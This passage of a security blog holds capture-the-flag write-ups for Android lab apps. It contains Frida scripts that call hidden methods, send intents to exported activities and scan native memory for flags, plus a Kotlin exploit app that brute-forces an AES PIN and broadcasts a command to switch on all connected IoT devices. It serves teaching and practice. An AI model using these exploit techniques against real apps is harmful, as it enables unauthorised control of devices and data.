\u0026#34;cipherText\u0026#34;); Intrinsics.checkNotNullParameter(key, \u0026#34;key\u0026#34;); Cipher cipher = Cipher.getInstance(algorithm); try { byte[] bytes = Activity2Kt.fixedIV.getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(bytes, \u0026#34;this as java.lang.String).getBytes(charset)\u0026#34;); IvParameterSpec ivSpec = new IvParameterSpec(bytes); cipher.init(2, key, ivSpec); byte[] decodedCipherText = Base64.decode(cipherText, 0); byte[] decrypted = cipher.doFinal(decodedCipherText); Intrinsics.checkNotNull(decrypted); return new String(decrypted, Charsets.UTF_8); } catch (Exception e) { throw new RuntimeException(\u0026#34;Decryption failed\u0026#34;, e); } } Moving the the decrypt function, this is basically just simple AES decryption where the encrypted strings (bqGrDKdQ8zo26HflRsGvVA==) and keys (your_secret_key_1234567890123456) is provided in the onCreate function. as for the IV, it is in the Activity2Kt.fixedIV which is 1234567890123456. After having all this information, it is possible to decrypt and get the correct strings easily.\nNow that I have everything I needed, time to move on to dynamic analysis to test if my understanding is correct or not.\nDynamic Analysis I first started by running the apk and see if my assumption is correct.\nThe strings seems to be coming out from the native library which what I expected.\n1 2 3 4 5 6 beryllium:/ # ls -la /data/data/com.mobilehackinglab.challenge/ total 40 drwx------ 4 u0_a229 u0_a229 4096 2025-03-21 21:24 . drwxrwx--x 322 system system 20480 2025-03-20 23:07 .. drwxrws--x 2 u0_a229 u0_a229_cache 4096 2025-03-21 21:24 cache drwxrwx--x 2 u0_a229 u0_a229 4096 2025-03-21 21:24 files I then tried to see if the KLOW function is executed or not by looking for the shared preferences file. It seems like it is not executed. I then tried to use frida to execute the function.\n1 2 3 4 5 6 7 8 9 10 11 Java.perform(()=\u0026gt; { Java.choose(\u0026#34;com.mobilehackinglab.challenge.MainActivity\u0026#34;, { onMatch: function (instance) { console.log(\u0026#34;Found MainActivity instance:\u0026#34;, instance); console.log(\u0026#34;called KLOW function:\u0026#34;, instance.KLOW()); }, onComplete: function() {} }); }); By using this frida script, I managed to execute the KLOW function.\n1 2 3 4 5 beryllium:/ # ls -la /data/data/com.mobilehackinglab.challenge/shared_prefs/ total 16 drwxrwx--x 2 u0_a229 u0_a229 4096 2025-03-21 21:29 . drwx------ 6 u0_a229 u0_a229 4096 2025-03-21 21:28 .. -rw-rw---- 1 u0_a229 u0_a229 117 2025-03-21 21:29 DAD4.xml Moving on to the Activity2 activity, the only way to trigger it is abusing the exported=true and providing the required intent. I managed to use frida script to send the intent which match the intent filter and the required information.\n1 2 3 4 5 6 7 8 9 10 11 12 13 setTimeout( ()=\u0026gt; { const ctx = Java.use(\u0026#34;android.app.ActivityThread\u0026#34;) .currentActivityThread() .getApplication() .getApplicationContext(); const A2 = Java.use(\u0026#34;com.mobilehackinglab.challenge.Activity2\u0026#34;); let intent = Java.use(\u0026#34;android.content.Intent\u0026#34;).$new(ctx, A2.class); intent.setAction(\u0026#34;android.intent.action.VIEW\u0026#34;); intent.setData(Java.use(\u0026#34;android.net.Uri\u0026#34;).parse(\u0026#34;mhl://labs/bWhsX3NlY3JldF8xMzM3\u0026#34;)); intent.setFlags(0x10000000); // FLAG_ACTIVITY_NEW_TASK ctx.startActivity(intent); console.log(\u0026#34;Intent Sent\u0026#34;,intent); },3000); This is the code to basically send the intent. The data is set to provide the required information mhl_secret_1337 in base64 encoded. Here\u0026rsquo;s what happen after reaching the code where it will load the other native library and peform a toast.\nAlthough I managed to get the string success, I still could not get the flag. I then tried to see what happened using frida-trace to check what is happening.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 PS E:\\Desktop\\Android\\frida-script\u0026gt; frida-trace -U -N com.mobilehackinglab.challenge -I \u0026#34;libflag.so\u0026#34; Instrumenting... Started tracing 14 functions. Web UI available at http://localhost:59982/ 12103 ms Java_com_mobilehackinglab_challenge_Activity2_getflag() 12103 ms | _Z9flag_fillv() 12103 ms | _Z6flag13v() 12103 ms | _Z3ZGSi() 12103 ms | _Z3tyyii() 12103 ms | _Z4asdsi() 12103 ms | _Z3zhsv() 12103 ms | _Z2x1ii() 12103 ms | _Z2ssi() 12103 ms | _Z9flag_fillv() 12103 ms | _Z6flag13v() 12103 ms | _Z6flag13v() 12103 ms | _Z6flag13v() 12103 ms | _Z3ZGSi() 12103 ms | _Z3tyyii() 12103 ms | _Z4asdsi() 12103 ms | _Z3zhsv() 12103 ms | _Z5dddffv() 12103 ms | _Z2ttv() 12103 ms | _Z2ddv() 12103 ms | _Z2x1ii() 12103 ms | _Z2ssi() 12103 ms | _Z2x1ii() 12103 ms | _Z2ssi() 12103 ms | _Z5dddffv() 12103 ms | _Z3zhsv() It looks like there\u0026rsquo;s a lot of function executed in the native library. I then look into the hints and rules provided.\nReverse engineer the application and search for exported activities. Understand the code and find a method to invoke the exported activity. Utilize Frida for tracing or employ Frida\u0026rsquo;s memory scanning. Don\u0026rsquo;t have to spend time on static analysis of the Android library, as the code is obfuscated. The flag follows the format \u0026ldquo;MHL{\u0026hellip;}\u0026rdquo;. Do not attempt to patch the application. Based on the hints and rules, it looks like i will need to focus on the frida\u0026rsquo;s memory scanning. I looked into the frida official documentation to understand more. It has some code example as well. After understanding it, it basically used to looks for specific \u0026ldquo;pattern\u0026rdquo;. The pattern is basically the character that I wanted to find.\n1 2 3 4 5 6 7 8 9 10 11 setTimeout(() =\u0026gt; { let m = Process.getModuleByName(\u0026#34;libflag.so\u0026#34;); let pattern = \u0026#34;4d 48 4c\u0026#34;; Memory.scan(m.base, m.size, pattern, { onMatch(address, size) { console.log(\u0026#39;Memory.scan() found match at\u0026#39;, address,\u0026#39;with size\u0026#39;, size); console.log(\u0026#39;Flag found: \u0026#39;,Memory.readCString(address)); console.log(hexdump(address)); } }); }, 1000); After modifying abit of the code, here\u0026rsquo;s how it looks like. The pattern is actually MHL but in hex and it will try to search for this hex in the memory. Here\u0026rsquo;s how the result looks like.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 [POCOPHONE F1::com.mobilehackinglab.challenge ]-\u0026gt; Memory.scan() found match at 0x7e5276805c with size 3 Flag found: MHL{IN_THE_MEMORY} 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7e5276805c 4d 48 4c 7b 49 4e 5f 54 48 45 5f 4d 45 4d 4f 52 MHL{IN_THE_MEMOR 7e5276806c 59 7d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Y}.............. 7e5276807c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276808c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276809c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e527680ac 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e527680bc 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e527680cc 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e527680dc 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e527680ec 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e527680fc 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276810c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276811c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276812c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276813c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7e5276814c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ Frida Script Here\u0026rsquo;s the full frida script to let everything run smoothly and get the flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 Java.perform(function () { Java.choose(\u0026#34;com.mobilehackinglab.challenge.MainActivity\u0026#34;, { onMatch: function (instance) { console.log(\u0026#34;Found MainActivity instance:\u0026#34;, instance); console.log(\u0026#34;called KLOW function:\u0026#34;, instance.KLOW()); }, onComplete: function() { sendIntent(); } }); }); function sendIntent(){ setTimeout( ()=\u0026gt; { const ctx = Java.use(\u0026#34;android.app.ActivityThread\u0026#34;) .currentActivityThread() .getApplication() .getApplicationContext(); const A2 = Java.use(\u0026#34;com.mobilehackinglab.challenge.Activity2\u0026#34;); let intent = Java.use(\u0026#34;android.content.Intent\u0026#34;).$new(ctx, A2.class); intent.setAction(\u0026#34;android.intent.action.VIEW\u0026#34;); intent.setData(Java.use(\u0026#34;android.net.Uri\u0026#34;).parse(\u0026#34;mhl://labs/bWhsX3NlY3JldF8xMzM3\u0026#34;)); intent.setFlags(0x10000000); // FLAG_ACTIVITY_NEW_TASK ctx.startActivity(intent); console.log(\u0026#34;Intent Sent\u0026#34;,intent); readMemoryfromNativeLib(); },3000); } function readMemoryfromNativeLib(){ setTimeout(() =\u0026gt; { let m = Process.getModuleByName(\u0026#34;libflag.so\u0026#34;); let pattern = \u0026#34;4d 48 4c 7b\u0026#34;; Memory.scan(m.base, m.size, pattern, { onMatch(address, size) { console.log(\u0026#39;Memory.scan() found match at\u0026#39;, address,\u0026#39;with size\u0026#39;, size); console.log(\u0026#39;Flag found: \u0026#39;,Memory.readCString(address)); console.log(hexdump(address)); } }); }, 1000); } Things I learned from this challenge frida script to execute a function, send a intent and read memory from native library. ","permalink":"https://callmeks.github.io/posts/mhl-strings/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Strings Challenge! In this lab,your goal is to find the flag. The flag\u0026rsquo;s format should be \u0026ldquo;MHL{\u0026hellip;}\u0026rdquo;. The challenge will give you a clear idea of how intents and intent filters work on android also you will get a hands-on experience using Frida APIs.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/Strings.apk\"\u003eStrings.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eThis is interesting challenge. I started with static analysis first.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eAs usual, I used \u003ccode\u003ejadx-gui\u003c/code\u003e to have a look at the source code.\u003c/p\u003e","title":"MHL Strings"},{"content":"Challenge Description This challenge focuses on exploiting a security flaw related to the broadcast receiver in the \u0026ldquo;IOT Connect\u0026rdquo; application, allowing unauthorized users to activate the master switch, which can turn on all connected devices. The goal is to send a broadcast in a way that only authenticated users can trigger the master switch.\nIOT Connect APK\nSolution As usual, I started by performing static analysis and dynamic analysis to fully understand what the code is doing.\nStatic Analysis I started off by decompiling it using jadx-gui. The first thing I look into is the AndroidManifest.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.iotconnect.LoginActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.iotconnect.SignupActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.iotconnect.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;receiver android:name=\u0026#34;com.mobilehackinglab.iotconnect.MasterReceiver\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;MASTER_ON\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; I noticed there are several activity and a receiver have this setting exported=true. Since the description mentioned about the broadcast receiver, I focused on the MasterReceiver. Surprisingly, MasterReceiver does not has it\u0026rsquo;s own activity. I then look around by using the global search feature.\n1 2 3 4 5 6 7 8 9 10 11 12 13 public void onReceive(Context context2, Intent intent) { if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, \u0026#34;MASTER_ON\u0026#34;)) { int key = intent.getIntExtra(\u0026#34;key\u0026#34;, 0); if (context2 != null) { if (Checker.INSTANCE.check_key(key)) { CommunicationManager.INSTANCE.turnOnAllDevices(context2); Toast.makeText(context2, \u0026#34;All devices are turned on\u0026#34;, 1).show(); } else { Toast.makeText(context2, \u0026#34;Wrong PIN!!\u0026#34;, 1).show(); } } } } After looking around, I managed to found the broadcast receiver code MasterReceiver under the CommunicationManager activity. The code basically getting an intent with a MASTER_ON action and a key extra. It then will check the key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 public final class Checker { public static final Checker INSTANCE = new Checker(); private static final String algorithm = \u0026#34;AES\u0026#34;; private static final String ds = \u0026#34;OSnaALIWUkpOziVAMycaZQ==\u0026#34;; private Checker() { } public final boolean check_key(int key) { try { return Intrinsics.areEqual(decrypt(ds, key), \u0026#34;master_on\u0026#34;); } catch (BadPaddingException e) { return false; } } public final String decrypt(String ds2, int key) { Intrinsics.checkNotNullParameter(ds2, \u0026#34;ds\u0026#34;); SecretKeySpec secretKey = generateKey(key); Cipher cipher = Cipher.getInstance(algorithm + \u0026#34;/ECB/PKCS5Padding\u0026#34;); cipher.init(2, secretKey); if (Build.VERSION.SDK_INT \u0026gt;= 26) { byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2)); Intrinsics.checkNotNull(decryptedBytes); return new String(decryptedBytes, Charsets.UTF_8); } throw new UnsupportedOperationException(\u0026#34;VERSION.SDK_INT \u0026lt; O\u0026#34;); } private final SecretKeySpec generateKey(int staticKey) { byte[] keyBytes = new byte[16]; byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(staticKeyBytes, \u0026#34;getBytes(...)\u0026#34;); System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length)); return new SecretKeySpec(keyBytes, algorithm); } } Double click the check_key will bring me to another code which basically check for the key. After understanding it, the code is a AES decryption and it basically check if the key can decrypt and return back the output master_on. It is possible to easily decrypt this and get the key.\nDynamic Analysis Now that I understand everything, I could just try to directly use adb to perform the attack.\n1 2 3 adb shell am broadcast -a MASTER_ON --ei key 345 Broadcasting: Intent { act=MASTER_ON flg=0x400000 (has extras) } Broadcast completed: result=0 1 2 3 2025-03-20 16:58:20.315 5513-5513 TURN ON com.mobilehackinglab.iotconnect D Turning all devices on 2025-03-20 16:58:20.329 5513-5513 TURN ON com.mobilehackinglab.iotconnect D Turning all devices on 2025-03-20 16:58:20.373 5513-5513 TURN ON com.mobilehackinglab.iotconnect D Turning all devices on By providing the required action MASTER_ON and correct key 345, I could easily trigger the broadcast receiver to successfully trigger the turnOnAllDevices function.\nCreating Exploit App It is also possible to perform Exploit App to perform the same thing. Do note that the victim app is needed to be run in background for the exploit to work.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 class MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) enableEdgeToEdge() setContent { IOTkonekTheme { Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding -\u0026gt; Exploit( modifier = Modifier.padding(innerPadding) ) } } } } } fun decrypt(): Int { val ds = \u0026#34;OSnaALIWUkpOziVAMycaZQ==\u0026#34; val algorithm = \u0026#34;AES\u0026#34; for (key in 0..9999) { // Brute-force search for the correct key try { val keyBytes = ByteArray(16) val keyString = key.toString().toByteArray(Charsets.UTF_8) System.arraycopy(keyString, 0, keyBytes, 0, minOf(keyString.size, keyBytes.size)) val cipher = Cipher.getInstance(\u0026#34;AES/ECB/PKCS5Padding\u0026#34;) cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(keyBytes, algorithm)) val decryptedBytes = cipher.doFinal(Base64.decode(ds, Base64.DEFAULT)) val decryptedText = String(decryptedBytes, Charsets.UTF_8).trim() if (decryptedText == \u0026#34;master_on\u0026#34;) { Log.i(\u0026#34;KEY\u0026#34;,\u0026#34;Correct key found: $key\u0026#34;) return key } } catch (_: Exception) { // Ignore errors for incorrect keys } } return 0 } @Composable fun Exploit(modifier: Modifier = Modifier) { val intent = Intent().apply { action = \u0026#34;MASTER_ON\u0026#34; putExtra(\u0026#34;key\u0026#34;, decrypt()) } LocalContext.current.sendBroadcast(intent) Text( text = \u0026#34;hacking 101\u0026#34;, modifier = modifier ) } The kotlin code contains 2 function, one is the decrypt function to get the pin and another one is to perform the exploit by sending a broadcast. It will trigger the turnOnAllDevices function when the exploit app is runned and the victim app is running in background.\nThings I learned from this challenge adb to send broadcast exported=true is dangerous sending broadcast by creating android app ","permalink":"https://callmeks.github.io/posts/mhl-iot-connect/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis challenge focuses on exploiting a security flaw related to the broadcast receiver in the \u0026ldquo;IOT Connect\u0026rdquo; application, allowing unauthorized users to activate the master switch, which can turn on all connected devices. The goal is to send a broadcast in a way that only authenticated users can trigger the master switch.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/IOTConnect.apk\"\u003eIOT Connect APK\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eAs usual, I started by performing static analysis and dynamic analysis to fully understand what the code is doing.\u003c/p\u003e","title":"MHL IOT Connect"},{"content":"Challenge Description The malware forensics lab identified a new technique for hiding and executing code dynamically. A sample that seems to use this technique has just arrived in their queue. Can you help them?\nSAW.apk\nSolution This is something that I think quite hard but yea another fun challenge.\nStatic Analysis As usual, I started with jadx-gui for reading the decompiled Java code.\n1 2 3 4 5 6 \u0026lt;activity android:name=\u0026#34;com.stego.saw.MainActivity\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; It seems like there\u0026rsquo;s only one activity to focus on. I then have a look in it. Inside the MainActivity.java, there\u0026rsquo;s a few that I think its interesting and useful.\n1 2 3 4 5 public native String a(String str, String str2); static { System.loadLibrary(\u0026#34;default\u0026#34;); } This is the code where it use native library. This means that I\u0026rsquo;ll need to have a look at the native library which can be found in Resources \u0026gt; lib \u0026gt; x86 (or any other) \u0026gt; libdefault.so inside the jadx-gui.\n1 2 3 4 5 6 7 8 9 Bundle extras = getIntent().getExtras(); if (extras == null) { finish(); return; } if (!extras.getString(\u0026#34;open\u0026#34;).equalsIgnoreCase(\u0026#34;sesame\u0026#34;)) { finish(); return; } This code is interesting as it requires user to provide extra strings inside the Intent in order to open the apps. This means that opening directly is impossible in this case.\n1 2 3 4 5 6 7 8 9 10 11 12 13 public void f() { WindowManager windowManager = (WindowManager) getSystemService(\u0026#34;window\u0026#34;); WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(200, 200, 2038, 8, -2); layoutParams.gravity = 17; Button button = new Button(getApplicationContext()); button.setOnClickListener(new View.OnClickListener() { // from class: com.stego.saw.MainActivity.2 @Override // android.view.View.OnClickListener public void onClick(View view) { MainActivity.this.alert(); } }); windowManager.addView(button, layoutParams); } A weird f function that seems to be related to window manager. After asking big boss CHATGPT, it\u0026rsquo;s trying to create an overlay button. The number 2038 is TYPE_APPLICATION_OVERLAY and it requires some permission to make it work.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public final String alert() { final EditText editText = new EditText(this); new AlertDialog.Builder(this).setTitle(\u0026#34;XOR XOR XOR\u0026#34;).setMessage(\u0026#34;XOR ME !\u0026#34;).setView(editText).setPositiveButton(\u0026#34;XORIFY\u0026#34;, new DialogInterface.OnClickListener() { // from class: com.stego.saw.MainActivity.4 @Override // android.content.DialogInterface.OnClickListener public void onClick(DialogInterface dialogInterface, int i) { MainActivity.this.answer = editText.getText().toString(); MainActivity mainActivity = MainActivity.this; mainActivity.a(mainActivity.FILE_PATH_PREFIX, MainActivity.this.answer); } }).setNegativeButton(\u0026#34;Cancel\u0026#34;, new DialogInterface.OnClickListener() { // from class: com.stego.saw.MainActivity.3 @Override // android.content.DialogInterface.OnClickListener public void onClick(DialogInterface dialogInterface, int i) { MainActivity.this.finish(); } }).show(); return this.answer; } This one is the alert function where it seems to be some kind of XOR ?? From what I know, this seems to be taking one input and try to send it into a(\u0026lt;filepath\u0026gt;,\u0026lt;input\u0026gt;) and the a function should be coming from native library.\nExploring Native Library This can be easily done by exporting the libdefault.so from jadx-gui and open it in ghidra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 void a(_JNIEnv *param_1,_jobject *param_2,_jstring *param_3,_jstring *param_4) { char *pcVar1; char *pcVar2; pcVar1 = (char *)(**(code **)(*(int *)param_1 + 0x2a4))(param_1,param_3,0,0x10ab1); pcVar2 = (char *)(**(code **)(*(int *)param_1 + 0x2a4))(param_1,param_4,0); _Z1aP7_JNIEnvP8_1(pcVar1,pcVar2); (**(code **)(*(int *)param_1 + 0x2a8))(param_1,param_3,pcVar1); (**(code **)(*(int *)param_1 + 0x29c))(param_1,pcVar1); return; } After going through abit, I started by looking into the function a. Based on the Java code, it takes in 2 input. The function a decompiled by ghidra has 4 argument, which I assume the last 2 is the one that the input is placed. Based on the code, it seems like it\u0026rsquo;s taking param_3 and param_4 as pcVar1 and pcVar2 which then put into function _Z1aP7_JNIEnvP8_1. Focusing on the function, I noticed that theres a weird function that seems to be interested.\n1 2 3 4 5 6 7 8 9 10 11 12 undefined4 _Z1aP7_JNIEnvP8_1(char *param_1,char *param_2) ... if (((int)*param_2 ^ l) == m) { if ((((((int)param_2[1] ^ DAT_00013a18) == DAT_00013a38) \u0026amp;\u0026amp; (((int)param_2[2] ^ DAT_00013a1c) == DAT_00013a3c)) \u0026amp;\u0026amp; (((int)param_2[3] ^ DAT_00013a20) == DAT_00013a40)) \u0026amp;\u0026amp; (((((int)param_2[4] ^ DAT_00013a24) == DAT_00013a44 \u0026amp;\u0026amp; (((int)param_2[5] ^ DAT_00013a28) == DAT_00013a48)) \u0026amp;\u0026amp; (((int)param_2[6] ^ DAT_00013a2c) == DAT_00013a4c)))) { uVar13 = 1; ppuVar12 = apuStack_c80 + 0x314; if (((int)param_2[7] ^ DAT_00013a30) == DAT_00013a50) While its abit messy, I noticed that its trying to take the characters of param_2 and try to XOR with some random variable. After understanding it, it seems like the variable consist of some hex numbers. here\u0026rsquo;s all the hex number after getting it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 l = 0x0A DAT_00013a18 = 0x0B DAT_00013a1c = 0x18 DAT_00013a20 = 0x0F DAT_00013a24 = 0x5E DAT_00013a28 = 0x31 DAT_00013a2c = 0x0C DAT_00013a30 = 0x0F m = 0x6C DAT_00013a38 = 0x67 DAT_00013a3c = 0x28 DAT_00013a40 = 0x6E DAT_00013a44 = 0x2A DAT_00013a48 = 0x58 DAT_00013a4c = 0x62 DAT_00013a50 = 0x68 Now that I have the hex, I could try to get the correct input by just XOR.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 sVar9 = strlen(param_1); local_2c = (char *)calloc(sVar9 + 2,1); strcpy(local_2c,param_1); sVar9 = strlen(local_2c); (local_2c + sVar9)[0] = \u0026#39;h\u0026#39;; (local_2c + sVar9)[1] = \u0026#39;\\0\u0026#39;; pFVar10 = fopen(local_2c,\u0026#34;wb\u0026#34;); if (pFVar10 == (FILE *)0x0) { uVar13 = 0; ppuVar12 = local_28; } else { pcVar11 = (char *)0xfffff3a0; local_24 = pFVar10; do { local_2c = pcVar11; fputc(*(int *)((int)(local_20 + 0x318) + (int)pcVar11),local_24); pcVar11 = local_2c + 4; } while (pcVar11 != (char *)0x0); fclose(local_24); ppuVar12 = local_28; } Moving on to the next part of the code where it uses the param_1, It seem\u0026rsquo;s like it is trying to open a file and write something into it. Since I have no idea what\u0026rsquo;s the remaining, I then tried to see how things works first.\nDynamic Analysis Lets start by opening the application. Remember that it requires some extra intent, so I will need to open it using adb instead of just clicking it.\n1 2 PS D:\\\u0026gt; adb shell am start -n com.stego.saw/.MainActivity --es \u0026#34;open\u0026#34; \u0026#34;sesame\u0026#34; Starting: Intent { cmp=com.stego.saw/.MainActivity (has extras) } After this, the next thing looks like some click me button. I tried clicking it but it does not show anything. It seems to be the overlay function f which requires some additional permission. After some research, I came across this article which could manually enable the setting. Mine is located at Privacy Protection \u0026gt; special permission \u0026gt; Display over other apps.\nAfter enabling it, clicking the button now appear another new square.\nI then click it again and it shows another overlay screen.\nThis looks like the input that will be used to XOR. I then tried to get the correct input first be decrypting it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 l = 0x0A DAT_00013a18 = 0x0B DAT_00013a1c = 0x18 DAT_00013a20 = 0x0F DAT_00013a24 = 0x5E DAT_00013a28 = 0x31 DAT_00013a2c = 0x0C DAT_00013a30 = 0x0F m = 0x6C DAT_00013a38 = 0x67 DAT_00013a3c = 0x28 DAT_00013a40 = 0x6E DAT_00013a44 = 0x2A DAT_00013a48 = 0x58 DAT_00013a4c = 0x62 DAT_00013a50 = 0x68 param_2 = [ m ^ l, DAT_00013a38 ^ DAT_00013a18, DAT_00013a3c ^ DAT_00013a1c, DAT_00013a40 ^ DAT_00013a20, DAT_00013a44 ^ DAT_00013a24, DAT_00013a48 ^ DAT_00013a28, DAT_00013a4c ^ DAT_00013a2c, DAT_00013a50 ^ DAT_00013a30 ] param_2_str = \u0026#34;\u0026#34;.join(chr(x) for x in param_2) print(f\u0026#34;param_2: {param_2_str}\u0026#34;) ## param_2: fl0ating Now I have a potential string, I tried to use this as the input and see what happened. Somehow, nothing happened and I just assume everything is working as intended. Now I need to search for the file location. it should be in /data/data/io.stego.saw/ as the path is taken from getApplicationContext().getApplicationInfo().dataDir + File.separatorChar.\n1 2 3 4 5 6 7 beryllium:/data/data/com.stego.saw # ls -la total 44 drwx------ 4 u0_a318 u0_a318 4096 2025-02-20 15:41 . drwxrwx--x 324 system system 20480 2025-02-19 21:53 .. drwxrws--x 2 u0_a318 u0_a318_cache 4096 2025-02-19 21:14 cache drwxrws--x 2 u0_a318 u0_a318_cache 4096 2025-02-19 21:14 code_cache -rw------- 1 u0_a318 u0_a318 792 2025-02-20 15:41 h Now there\u0026rsquo;s a h file which looks similar according to the native library. I then tried to read the file to see what it is.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 beryllium:/data/data/com.stego.saw # file h h: Android dex file, version 035 beryllium:/data/data/com.stego.saw # strings h \u0026lt;init\u0026gt; HTB{SawS0DCLing} Ljava/io/PrintStream; Ljava/lang/Object; Ljava/lang/String; Ljava/lang/System; [Ljava/lang/String; abcde.java logprint main println Although it\u0026rsquo;s an Android dex file, I managed to get some strings from it which one of it is the flag.\nInteresting Finding 1 Since this challenge focus on the native library and I had fully understand how it works, I think it is possible to use frida script to skip the overlay permission.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 Java.perform(()=\u0026gt; { Java.scheduleOnMainThread(()=\u0026gt; { let MainActivity = Java.use(\u0026#34;com.stego.saw.MainActivity\u0026#34;); let yeet = MainActivity.$new(); let test = yeet.a(\u0026#34;/data/data/com.stego.saw/\u0026#34;,\u0026#34;fl0ating\u0026#34;); console.log(\u0026#34;yeet.a() result = \u0026#34; + test); }); Java.perform(function () { var openFunc = Module.findExportByName(null, \u0026#34;open\u0026#34;); var readFunc = Module.findExportByName(null, \u0026#34;read\u0026#34;); if (!openFunc || !readFunc) { console.log(\u0026#34;[!] Failed to find open() or read(). Exiting.\u0026#34;); return; } var filePath = \u0026#34;/data/data/com.stego.saw/h\u0026#34;; // Open the file var libc = Module.findExportByName(null, \u0026#34;open\u0026#34;); var fd = new NativeFunction(libc, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;int\u0026#34;])(Memory.allocUtf8String(filePath), 0); // Read from the file var buffer = Memory.alloc(1024); var bytesRead = new NativeFunction(readFunc, \u0026#34;int\u0026#34;, [\u0026#34;int\u0026#34;, \u0026#34;pointer\u0026#34;, \u0026#34;int\u0026#34;])(fd, buffer, 1024); if (bytesRead \u0026gt; 0) { var rawData = Memory.readByteArray(buffer, bytesRead); var asciiString = Array.prototype.map.call(new Uint8Array(rawData), function (byte) { return (byte \u0026gt;= 32 \u0026amp;\u0026amp; byte \u0026lt;= 126) ? String.fromCharCode(byte) : \u0026#39;.\u0026#39;; }).join(\u0026#39;\u0026#39;); console.log(\u0026#34;[+] File Content (ASCII Only):\\n\u0026#34; + asciiString); } else { console.log(\u0026#34;[-] No data read from file.\u0026#34;); } }); }); By using this frida script, it is possible to directly read the flag in file 